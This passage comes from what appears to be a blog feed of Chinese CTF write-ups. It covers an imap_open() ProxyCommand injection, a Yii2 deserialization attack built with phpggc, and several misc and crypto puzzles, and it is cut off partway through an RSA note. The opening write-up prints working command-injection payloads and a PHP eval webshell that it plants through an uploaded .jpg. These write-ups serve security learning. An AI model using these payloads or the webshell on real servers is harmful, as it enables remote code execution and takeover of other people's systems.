$server;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=echo\tZWNobyAnPD9waHAgcGhwaW5mbygpOycgPiAvdmFyL3d3dy9odG1sL3VzZXIvc2t5LnBocA==|base64\t-d|bash</span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><img src="/images/2019-02-25-18-55-28.png" alt=""><br>发现参数不被允许提醒，此时猜测是不是存在过滤，我们测试一下<br><img src="/images/2019-02-25-18-55-59.png" alt=""><br><img src="/images/2019-02-25-18-57-02.png" alt=""><br><img src="/images/2019-02-25-18-57-24.png" alt=""><br>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64,|,\</span><br></pre></td></tr></table></figure></p><p>均被过滤，那么既然如此，该如何进行任意文件写入呢？</p><h2 id="upload助攻"><a href="#upload助攻" class="headerlink" title="upload助攻"></a>upload助攻</h2><p>此时不难想起，之前还有一个上传功能，路径如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir = <span class="string">'./user/'</span>.$username.<span class="string">'.jpg'</span>;</span><br></pre></td></tr></table></figure></p><p>我们是已知文件名和路径的，那么能否在文件内容做文章，进行运用？<br>这里不难想到，可以直接使用<code>bash filename</code><br>例如<br><img src="/images/2019-02-25-19-02-25.png" alt=""><br>那么我们只需要构造文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;echo &quot;&lt;?php phpinfo();&quot;&gt; skysky.php&apos; &gt; skysky.jpg</span><br></pre></td></tr></table></figure></p><p>然后上传skysky.jpg，再利用imap_open() RCE即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=bash skysky.jpg&#125;</span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><img src="/images/2019-02-25-19-09-54.png" alt=""><br><img src="/images/2019-02-25-19-16-58.png" alt=""><br><img src="/images/2019-02-25-19-17-26.png" alt=""><br>发现成功执行phpinfo()</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>那么故技重施，即可getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;echo &quot;&lt;?php eval(\$_REQUEST[sky]);&quot;&gt; skysky.php&apos; &gt; skysky.jpg</span><br><span class="line">any -o ProxyCommand=bash skysky.jpg&#125;</span><br></pre></td></tr></table></figure></p><p>菜刀连上，即可getshell<br><img src="/images/2019-02-25-19-19-11.png" alt=""><br><img src="/images/2019-02-25-19-19-21.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道题目再一次说明了思路很重要，如果思路不明确，尝试注入，upload等则很容易被这道题目带入误区XD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/171707</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本题为2019安恒2月月赛的my email，从漏洞点发现到getshell还是有点意思的，以下是记录&lt;/p&gt;
&lt;h2 id=&quot;信息搜集&quot;&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019安恒杯-2月月赛Writeup</title>
    <link href="http://skysec.top/2019/02/24/2019%E5%AE%89%E6%81%92%E6%9D%AF-2%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://skysec.top/2019/02/24/2019安恒杯-2月月赛Writeup/</id>
    <published>2019-02-24T01:46:41.000Z</published>
    <updated>2019-02-28T04:48:03.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末叕刷了安恒月赛，以下是Web&amp;Crypto&amp;Misc题解记录</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babycms"><a href="#babycms" class="headerlink" title="babycms"></a>babycms</h3><p>打开题目，发现是Yii2框架写的平台，首先进行信息搜集，得到源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.71.29.5:10015/web.zip</span><br></pre></td></tr></table></figure></p><p>审计代码，发现<code>/views/medicine/view.php</code>存在反序列化操作<br><img src="/images/2019-02-24-14-43-01.png" alt=""><br>寻找可利用类，查看composer.json，发现存在RCE漏洞组件<br><img src="/images/2019-02-24-14-46-10.png" alt=""><br>利用phpggc，可以看到有对应版本的攻击<br><img src="/images/2019-02-24-14-19-46.png" alt=""><br>查看文件运行路径<br><img src="/images/2019-02-24-14-53-23.png" alt=""><br><img src="/images/2019-02-24-18-57-48.png" alt=""><br>尝试文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/runtime</span><br></pre></td></tr></table></figure></p><p>直接使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc SwiftMailer/FW3 /var/www/html/runtime/sky.php ~/Desktop/sky.php -b</span><br></pre></td></tr></table></figure></p><p>得到payload<br><img src="/images/2019-02-24-14-54-07.png" alt=""><br>同时发现登录密码<br><img src="/images/2019-02-24-19-12-10.png" alt=""><br>登入后，即可使用payload getshell拿到flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="来玩个游戏吧"><a href="#来玩个游戏吧" class="headerlink" title="来玩个游戏吧"></a>来玩个游戏吧</h3><p><img src="/images/2019-02-24-10-34-55.png" alt=""><br>第一关一看就知道是盲文加密<br><img src="/images/2019-02-24-14-03-08.png" alt=""><br>使用在线网站解密<br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⠏⠏⠄⠁⠄⠀⠂⡑⡒⡓⠄⡒⠂⡑⠇⠆⡒⠉⠇⠁⠉⡔⠉⠁⠁⠀⠁⠇⡓⠅⠉⠂=</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??41402abc4b2a76b9719d911017c592</span><br></pre></td></tr></table></figure></p><p>发现是开头未知2位的md5，扔到百度去<br><img src="/images/2019-02-24-14-06-48.png" alt=""><br>发现是hello，提交通过第一关，第二关是一个md5碰撞，我们使用github的项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_coll_test.py</span><br></pre></td></tr></table></figure></p><p>得到几百个相同md5的文件，随便挑选两个<br><img src="/images/2019-02-24-14-10-18.png" alt=""><br><img src="/images/2019-02-24-14-11-11.png" alt=""><br>得到最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Dear Professional ; Especially for you - this cutting-edge </span><br><span class="line">intelligence ! If you no longer wish to receive our </span><br><span class="line">publications simply reply with a Subject: of &quot;REMOVE&quot; </span><br><span class="line">and you will immediately be removed from our club . </span><br><span class="line">This mail is being sent in compliance with Senate bill </span><br><span class="line">2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL </span><br><span class="line">MARKETING . Why work for somebody else when you can </span><br><span class="line">become rich as few as 35 weeks . Have you ever noticed </span><br><span class="line">more people than ever are surfing the web and people </span><br><span class="line">will do almost anything to avoid mailing their bills </span><br><span class="line">. Well, now is your chance to capitalize on this ! </span><br><span class="line">WE will help YOU decrease perceived waiting time by </span><br><span class="line">120% &amp; decrease perceived waiting time by 140% . You </span><br><span class="line">can begin at absolutely no cost to you . But don&apos;t </span><br><span class="line">believe us ! Mrs Jones of Minnesota tried us and says </span><br><span class="line">&quot;I was skeptical but it worked for me&quot; . We assure </span><br><span class="line">you that we operate within all applicable laws . Because </span><br><span class="line">the Internet operates on &quot;Internet time&quot; you must act </span><br><span class="line">now ! Sign up a friend and your friend will be rich </span><br><span class="line">too . Warmest regards . Dear Cybercitizen , We know </span><br><span class="line">you are interested in receiving red-hot announcement </span><br><span class="line">! We will comply with all removal requests ! This mail </span><br><span class="line">is being sent in compliance with Senate bill 1619 ; </span><br><span class="line">Title 2 ; Section 301 . This is NOT unsolicited bulk </span><br><span class="line">mail ! Why work for somebody else when you can become </span><br><span class="line">rich within 53 MONTHS ! Have you ever noticed more </span><br><span class="line">people than ever are surfing the web and more people </span><br><span class="line">than ever are surfing the web . Well, now is your chance </span><br><span class="line">to capitalize on this . We will help you use credit </span><br><span class="line">cards on your website plus decrease perceived waiting </span><br><span class="line">time by 150% . The best thing about our system is that </span><br><span class="line">it is absolutely risk free for you ! But don&apos;t believe </span><br><span class="line">us ! Mrs Simpson of Washington tried us and says &quot;Now </span><br><span class="line">I&apos;m rich, Rich, RICH&quot; . We assure you that we operate </span><br><span class="line">within all applicable laws ! We beseech you - act now </span><br><span class="line">! Sign up a friend and your friend will be rich too </span><br><span class="line">. Thank-you for your serious consideration of our offer </span><br><span class="line">! Dear Friend ; This letter was specially selected </span><br><span class="line">to be sent to you ! If you no longer wish to receive </span><br><span class="line">our publications simply reply with a Subject: of &quot;REMOVE&quot; </span><br><span class="line">and you will immediately be removed from our mailing </span><br><span class="line">list . This mail is being sent in compliance with Senate </span><br><span class="line">bill 2716 , Title 2 ; Section 306 ! This is a ligitimate </span><br><span class="line">business proposal . Why work for somebody else when </span><br><span class="line">you can become rich inside 33 weeks . Have you ever </span><br><span class="line">noticed more people than ever are surfing the web plus </span><br><span class="line">more people than ever are surfing the web . Well, now </span><br><span class="line">is your chance to capitalize on this ! WE will help </span><br><span class="line">YOU SELL MORE and process your orders within seconds </span><br><span class="line">. You can begin at absolutely no cost to you . But </span><br><span class="line">don&apos;t believe us ! Mrs Jones of Kentucky tried us and </span><br><span class="line">says &quot;I was skeptical but it worked for me&quot; ! This </span><br><span class="line">offer is 100% legal ! We implore you - act now . Sign </span><br><span class="line">up a friend and you&apos;ll get a discount of 50% . God </span><br><span class="line">Bless .</span><br></pre></td></tr></table></figure></p><p>根据题目描述信息，google一下”垃圾邮件+栅格密码”，得到解密网站<a href="http://www.spammimic.com/decode.shtml进行解密得到" target="_blank" rel="noopener">http://www.spammimic.com/decode.shtml进行解密得到</a><br><img src="/images/2019-02-24-14-13-58.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a0dd1e2e6b87fe47e5ad0184dc291e04&#125;</span><br></pre></td></tr></table></figure></p><h3 id="非常简单的流量分析"><a href="#非常简单的流量分析" class="headerlink" title="非常简单的流量分析"></a>非常简单的流量分析</h3><p>下载附件，打开流量包过滤<code>http</code><br>发现robots.txt，进一步分析发现robots.txt中存在abc.html<br><img src="/images/2019-02-24-10-40-18.png" alt=""><br>继续分析abc.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;abc.html&quot;</span><br></pre></td></tr></table></figure></p><p>得到md5字符串和两串DES<br><img src="/images/2019-02-24-10-41-08.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5 0x99a98e067af6b09e64f3740767096c96</span><br><span class="line"></span><br><span class="line">DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d(129-&gt;143)</span><br><span class="line"></span><br><span class="line">DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b(143-&gt;129)</span><br></pre></td></tr></table></figure></p><p>继续往下分析<br><img src="/images/2019-02-24-10-55-26.png" alt=""><br><img src="/images/2019-02-24-11-09-05.png" alt=""><br>发现都是IPSec加密后的流量，尝试使用已知信息和wireshark还原解密<br><img src="/images/2019-02-24-11-49-33.png" alt=""><br>还原之后发现访问的http带有ascii码，解密前几个发现是flag<br><img src="/images/2019-02-24-11-49-15.png" alt=""><br>于是将38个asiic码提取出来，然后拼接<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">101</span>,<span class="number">53</span>,<span class="number">97</span>,<span class="number">57</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">97</span>,<span class="number">48</span>,<span class="number">101</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">125</span>]</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">res +=chr(i)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-24-11-53-05.png" alt=""></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码本"><a href="#密码本" class="headerlink" title="密码本"></a>密码本</h3><p>拿到题目信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个密码本本该只使用一次的，但是却使用了多次，导致密文易被破解</span><br><span class="line">经过一番尝试发现，秘钥的首字母很可能是y，剩下的就靠你了</span><br><span class="line"></span><br><span class="line">cip1: rlojsfklecby</span><br><span class="line">cip2: ulakqfgfsjlu</span><br><span class="line">cip3: dpaxwxtjgtay</span><br></pre></td></tr></table></figure></p><p>寻找首字母为y的单词，尝试一下year<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key = &apos;year&apos;</span><br><span class="line">c1 = &apos;rlojsfklecby&apos;</span><br><span class="line">c2 = &apos;ulakqfgfsjlu&apos;</span><br><span class="line">c3 = &apos;dpaxwxtjgtay&apos;</span><br><span class="line">res1 = &apos;&apos;</span><br><span class="line">res2 = &apos;&apos;</span><br><span class="line">res3 = &apos;&apos;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">res1+=chr((((ord(c1[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">res2+=chr((((ord(c2[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">res3+=chr((((ord(c3[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">print res1</span><br><span class="line">print res2</span><br><span class="line">print res3</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thos</span><br><span class="line">what</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></p><p>看到thos，猜测下一个是e，即those，测试了一下，发现key此时为<code>yearo</code><br>得到结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">those</span><br><span class="line">whatc</span><br><span class="line">flagi</span><br></pre></td></tr></table></figure></p><p>估摸着下一个应该是s，毕竟<code>flagis</code>，继续探测出，此时为<code>yearof</code>，得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosea</span><br><span class="line">whatca</span><br><span class="line">flagis</span><br></pre></td></tr></table></figure></p><p>此时没有了头绪，去词典搜一下<br><img src="/images/2019-02-24-19-49-18.png" alt=""><br>尝试了一下，发现key到<code>yearofthe</code>为止是有意义的，结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosearea</span><br><span class="line">whatcanyo</span><br><span class="line">flagisacc</span><br></pre></td></tr></table></figure></p><p>看第二个明文，猜测下一个是u，因为what can you，测试得到key为<code>yearofthep</code>，明文为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosearean</span><br><span class="line">whatcanyou</span><br><span class="line">flagisacce</span><br></pre></td></tr></table></figure></p><p>猜测第3个明文是flagisaccess，此时key为<code>yearofthepig</code>，解出明文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thoseareants</span><br><span class="line">whatcanyoudo</span><br><span class="line">flagisaccess</span><br></pre></td></tr></table></figure></p><p>我真是服了这个出题人了………………</p><h3 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h3><p>拿到题目发现是CRC32爆破，使用工具进行如下破解<br><img src="/images/2019-02-24-10-12-58.png" alt=""><br><img src="/images/2019-02-24-10-13-15.png" alt=""><br><img src="/images/2019-02-24-10-13-28.png" alt=""><br><img src="/images/2019-02-24-10-13-40.png" alt=""><br>得到压缩包密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tanny_is_very_beautifu1_</span><br></pre></td></tr></table></figure></p><p>解密后拿到flag.pdf，得到如下信息<br><img src="/images/2019-02-24-10-14-02.png" alt=""><br>需要我们进行排列组合，得到结果的Sha1为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e6079c5ce56e781a50f4bf853cdb5302e0d8f054</span><br></pre></td></tr></table></figure></p><p>排列组合大致如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1!</span><br><span class="line">2@</span><br><span class="line">&#123;[</span><br><span class="line">&#125;]</span><br><span class="line">asefcghnl</span><br></pre></td></tr></table></figure></p><p>直接刚可能性太多，这里我们知道应该是flag{}样式，所以缩小范围为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1!</span><br><span class="line">2@</span><br><span class="line">sechn</span><br></pre></td></tr></table></figure></p><p>编写如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(str)</span>:</span></span><br><span class="line">    sha = hashlib.sha1(str)</span><br><span class="line">    encrypts = sha.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> encrypts</span><br><span class="line">a1 = <span class="string">'1!'</span></span><br><span class="line">a2 = <span class="string">'2@'</span></span><br><span class="line">a3 = <span class="string">'&#123;'</span></span><br><span class="line">a4 = <span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">for</span> str1 <span class="keyword">in</span> itertools.combinations(a1,<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> str2 <span class="keyword">in</span> itertools.combinations(a2,<span class="number">1</span>):</span><br><span class="line">        str3 = str1[<span class="number">0</span>]+str2[<span class="number">0</span>]+<span class="string">'sechn'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(str3):</span><br><span class="line">            tmp = (<span class="string">''</span>.join(i))</span><br><span class="line">            res = <span class="string">'flag&#123;'</span>+tmp+<span class="string">'&#125;'</span></span><br><span class="line">            <span class="comment"># print sha1(res)</span></span><br><span class="line">            <span class="keyword">if</span> sha1(res) == <span class="string">'e6079c5ce56e781a50f4bf853cdb5302e0d8f054'</span>:</span><br><span class="line">                <span class="keyword">print</span> res</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sh@1enc&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/171543</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末叕刷了安恒月赛，以下是Web&amp;amp;Crypto&amp;amp;Misc题解记录&lt;/p&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#We
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Week4-Crypto&amp;MixedRSA_Easy</title>
    <link href="http://skysec.top/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/"/>
    <id>http://skysec.top/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/</id>
    <published>2019-02-22T02:30:02.000Z</published>
    <updated>2019-02-22T02:30:31.460Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/2019-02-22-10-30-28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/2019-02-22-10-30-28.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈RSA公钥非素数问题</title>
    <link href="http://skysec.top/2019/02/21/%E6%B5%85%E8%B0%88RSA%E5%85%AC%E9%92%A5%E9%9D%9E%E7%B4%A0%E6%95%B0%E9%97%AE%E9%A2%98/"/>
    <id>http://skysec.top/2019/02/21/浅谈RSA公钥非素数问题/</id>
    <published>2019-02-21T06:07:48.000Z</published>
    <updated>2019-02-21T06:41:42.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刷题，遇到2道公钥不互素的题目，这里简单记录一下解决方案，主要还是灵活掌握公式推导。</p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>题干如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e = 12</span><br><span class="line">p = 58380004430307803367806996460773123603790305789098384488952056206615768274527</span><br><span class="line">q = 81859526975720060649380098193671612801200505029127076539457680155487669622867</span><br><span class="line">ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span><br><span class="line"></span><br><span class="line">算出的m转化成字符串</span><br></pre></td></tr></table></figure></p><p>我们知道RSA的概述公式如下</p><script type="math/tex; mode=display">c \equiv m^{e} \text{ } mod \text{ } n \\m \equiv c^{d} \text{ } mod \text{ } n \\\phi (n) = (p-1)*(q-1) \\d*e \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>我们现在既然已知p,q，根据公式</p><script type="math/tex; mode=display">d*e \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>我们可以得到</p><script type="math/tex; mode=display">d  \equiv e^{-1} \text{ } mod \text{ } \phi (n)</script><p>那么求e对于phi_n的逆元即可，我们可以使用<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.invmod(e,phi_n)</span><br></pre></td></tr></table></figure></p><p>那么问题来了，我们运行后却得到报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: no invmod for given @a and @n</span><br></pre></td></tr></table></figure></p><p>这是为什么呢？我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print libnum.gcd(e,phi_n)</span><br></pre></td></tr></table></figure></p><p>发现结果为4，那么原因很明显，因为公钥和phi_n不互素<br>这里我们可以将公钥进行拆分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = 12 = 3*4</span><br></pre></td></tr></table></figure></p><p>我们可以知道</p><script type="math/tex; mode=display">d*3*4 \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>既然phi_n与3<em>4不互素，我们可以灵活的将4</em>d看成一个整体，得到</p><script type="math/tex; mode=display">d*4 \equiv 3^{-1} \text{ } mod \text{ } \phi (n)</script><p>这样一来，我们可以求出4d，因为gcd(3,phi_n)=1<br>那么既然是4d，怎么解密呢？<br>我们知道</p><script type="math/tex; mode=display">m \equiv c^{d} \text{ } mod \text{ } n \\d*4 \equiv 3^{-1} \text{ } mod \text{ } \phi (n)</script><p>我们不妨将式1两边同时4次方，为验证两边依旧相等，我们做如下证明：<br>首先将同余式换成等式</p><script type="math/tex; mode=display">m = k*n + c^{d}</script><p>同时4次方</p><script type="math/tex; mode=display">m^4 = (k*n+c^d)^4</script><p>我们知道右边多项式展开后，除了最后一项为<code>c^4d</code>以外，其余每项必然带着n<br>我们等式两边同时取余n，得到</p><script type="math/tex; mode=display">m^4 \equiv c^{4d} \text{ } mod \text{ } n \\</script><p>这样一来我们可以构造出4d的解密形式，我们不妨进行计算<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span 